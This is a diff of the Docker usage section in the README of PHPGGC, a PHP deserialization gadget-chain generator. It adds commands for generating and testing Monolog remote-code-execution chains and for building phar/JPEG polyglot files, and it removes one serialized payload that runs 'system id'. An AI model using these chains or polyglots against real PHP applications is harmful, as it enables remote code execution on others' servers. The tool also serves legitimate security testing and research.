@@ -332,16 +332,38 @@ For instance, use `./phpggc -n Drupal RCE` would create a new Drupal RCE gadgetc
 
 # Docker
 
-If you don't want to install PHP, you can use `docker build . -t 'phpggc'`.
+If you don't want to install PHP, you can build a docker image using:
 
-To generate a gadget chain.
+```
+$ docker build . -t 'phpggc'
+```
+
+You can then used the dockerized `phpggc`.
+
+### To generate a gadget chain
 
 ```
 $ docker run phpggc Monolog/rce1 'system' 'id'
-O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";r:2;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:2:"id";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}
 ```
 
-To run `test-gc-compatibility.py` from docker.
+### To test a chain 
+
+Jump to your environment's folder and run the chain argument-free, with the `--test-payload` option:
+
+```
+$ docker run -v "$(pwd)":/app -w /app phpggc Monolog/RCE9 --test-payload
+```
+
+### To generate phar / polyglot files
+
+> Note: The command must be executed in the directory where the input image is located.
+
+```
+$ docker run -v "$(pwd)":/images phpggc -pj /images/dummy.jpg -o /images/z.zip.phar Monolog/RCE9 system id
+```
+
+### To run `test-gc-compatibility.py`
+
 ```
 $ docker run --entrypoint './test-gc-compatibility.py' phpggc doctrine/doctrine-bundle:2.2,2.7.2 doctrine/rce1 doctrine/rce2
 Runing on PHP version ('PHP 8.1.13 (cli) (built: Nov 30 2022 21:53:44) (NTS).
